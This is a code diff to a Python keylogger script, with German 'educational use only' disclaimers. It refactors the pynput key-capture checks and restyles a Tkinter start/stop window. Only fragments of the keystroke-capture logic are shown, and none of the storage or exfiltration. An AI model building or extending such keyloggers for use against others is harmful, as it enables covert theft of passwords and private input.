@@ -1,6 +1,6 @@
-# Dieses Skript dient ausschließlich zu Bildungszwecken.
-# Die Nutzung für illegale Zwecke ist verboten.
-# Der Autor übernimmt keine Haftung für Schäden oder Missbrauch.
+#Dieses Skript dient ausschließlich zu Bildungszwecken.
+#Die Nutzung für illegale Zwecke ist verboten.
+#Der Autor übernimmt keine Haftung für Schäden oder Missbrauch.
 import tkinter as tk
 from pynput import keyboard
 import ctypes
@@ -19,7 +19,7 @@ def on_press(key):
     if not is_logging:
         return
 
-    if key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
+    if key in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r):
         shift_pressed = True
         return
 
@@ -45,7 +45,7 @@ def on_press(key):
 
 def on_release(key):
     global shift_pressed
-    if key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
+    if key in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r):
         shift_pressed = False
 
 def start_logging():
@@ -64,14 +64,18 @@ def stop_logging():
 
 root = tk.Tk()
 root.title("Keylogger (Lernversion)")
-root.geometry("300x150")
+root.geometry("280x140")
+root.resizable(False, False)
 
-start_btn = tk.Button(root, text="Start", command=start_logging, width=10)
-stop_btn = tk.Button(root, text="Stop", command=stop_logging, width=10)
-status_label = tk.Label(root, text="Status: Idle")
+frame = tk.Frame(root, padx=20, pady=20)
+frame.pack(expand=True)
 
-start_btn.pack(pady=10)
-stop_btn.pack(pady=5)
-status_label.pack(pady=10)
+start_btn = tk.Button(frame, text="Start", command=start_logging, width=12)
+stop_btn = tk.Button(frame, text="Stop", command=stop_logging, width=12)
+status_label = tk.Label(frame, text="Status: Idle", anchor="center")
+
+start_btn.grid(row=0, column=0, padx=5, pady=5)
+stop_btn.grid(row=0, column=1, padx=5, pady=5)
+status_label.grid(row=1, column=0, columnspan=2, pady=10)
 
 root.mainloop()
